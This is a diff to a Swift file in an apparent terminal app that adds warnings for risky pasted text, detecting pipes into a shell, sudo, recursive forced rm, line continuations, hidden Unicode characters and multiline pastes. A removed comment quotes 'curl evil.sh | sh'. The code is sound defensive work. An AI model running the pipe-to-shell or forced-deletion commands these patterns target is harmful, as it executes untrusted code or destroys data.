@@ -15,11 +15,12 @@
 // SPDX-License-Identifier: Apache-2.0
 
 import Foundation
+import CortaTerminal
 
 /// Sanitises and wraps pasted text for the child (`SECURITY.md` §2.3: "a
 /// paste is data, never a command stream"): strip ESC and other C0, and
-/// warn on a newline without bracketed paste, where it would run the line
-/// (`curl evil.sh | sh`). `nonisolated` so it is testable.
+/// identify risky shell text and concealed scalars even with bracketed
+/// paste, plus newlines without it. `nonisolated` so it is testable.
 nonisolated enum Paste {
     /// The ?2004 markers.
     static let bracketStart: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x30, 0x7E]
@@ -45,6 +46,73 @@ nonisolated enum Paste {
         // CRLF is one Swift Character; matching individual Characters misses
         // it. The child receives bytes, so inspect the scalar representation.
         !bracketedPasteEnabled && text.unicodeScalars.contains { $0.value == 10 || $0.value == 13 }
+    }
+
+    enum PasteRisk: String, CaseIterable, Sendable {
+        case shellPipe, sudo, recursiveDelete, continuation, concealed, multiline
+
+        var localizationKey: String { "paste.risk." + rawValue }
+    }
+
+    /// Conservative, deterministic patterns, not a shell parser. Inspect the
+    /// sanitized payload so stripped controls cannot split a dangerous word.
+    static func risks(in text: String, bracketedPasteEnabled: Bool = true) -> [PasteRisk] {
+        let payload = sanitized(text)
+        let joined = payload.replacingOccurrences(of: "\\\r\n", with: "")
+            .replacingOccurrences(of: "\\\n", with: "")
+            .replacingOccurrences(of: "\\\r", with: "")
+            .replacingOccurrences(of: #"\\(.)"#, with: "$1", options: .regularExpression)
+            .replacingOccurrences(of: "'", with: "")
+            .replacingOccurrences(of: "\"", with: "")
+        func matches(_ pattern: String) -> Bool {
+            joined.range(of: pattern, options: .regularExpression) != nil
+        }
+        var result: [PasteRisk] = []
+        if matches(#"\|&?\s*(?:(?:/[^\s;|&]+/)?sudo\s+(?:-[^\s;|&]+\s+)*(?:(?:root|[0-9]+)\s+)?)?(?:/[^\s;|&]+/)?(?:sh|bash|zsh|fish|dash|ksh|csh|tcsh)(?=$|[\s;|&])"#) {
+            result.append(.shellPipe)
+        }
+        if matches(#"(?:^|[\s;|&()`'"])(?:/[^\s;|&]+/)?sudo(?=$|[\s;|&()`'"])"#) {
+            result.append(.sudo)
+        }
+        // Options may be combined, separate, long, or interspersed with paths.
+        let commands = joined.components(separatedBy: CharacterSet(charactersIn: ";|&\n\r"))
+        for command in commands {
+            let words = command.split(whereSeparator: { $0.isWhitespace }).map(String.init)
+            guard let index = words.firstIndex(where: { $0 == "rm" || $0.hasSuffix("/rm") }) else { continue }
+            let options = words.dropFirst(index + 1).prefix(while: { $0 != "--" }).filter { $0.hasPrefix("-") }
+            let recursive = options.contains { $0 == "--recursive" || (!$0.hasPrefix("--") && ($0.contains("r") || $0.contains("R"))) }
+            let force = options.contains { $0 == "--force" || (!$0.hasPrefix("--") && $0.contains("f")) }
+            if recursive && force { result.append(.recursiveDelete); break }
+        }
+        if payload.range(of: #"\\(?:\r\n|\n|\r)"#, options: .regularExpression) != nil {
+            result.append(.continuation)
+        }
+        if text.unicodeScalars.contains(where: { ConcealingScalars.contains($0.value) }) {
+            result.append(.concealed)
+        }
+        if needsWarning(text: payload, bracketedPasteEnabled: bracketedPasteEnabled) {
+            result.append(.multiline)
+        }
+        return result
+    }
+
+    static func warningRisks(
+        in text: String, bracketedPasteEnabled: Bool, policy: Configuration.PasteWarning
+    ) -> [PasteRisk] {
+        guard policy != .off else { return [] }
+        var result = risks(in: text, bracketedPasteEnabled: bracketedPasteEnabled)
+        if policy == .always, needsWarning(text: text, bracketedPasteEnabled: false),
+            !result.contains(.multiline) { result.append(.multiline) }
+        return result
+    }
+
+    /// Never let the preview conceal the very characters it warns about.
+    static func visiblePreview(_ text: String) -> String {
+        text.unicodeScalars.map { scalar in
+            ConcealingScalars.contains(scalar.value)
+                ? "⟦U+" + String(scalar.value, radix: 16, uppercase: true) + "⟧"
+                : String(scalar)
+        }.joined()
     }
 
     /// What ends a paste for the child: the closing marker when bracketed.
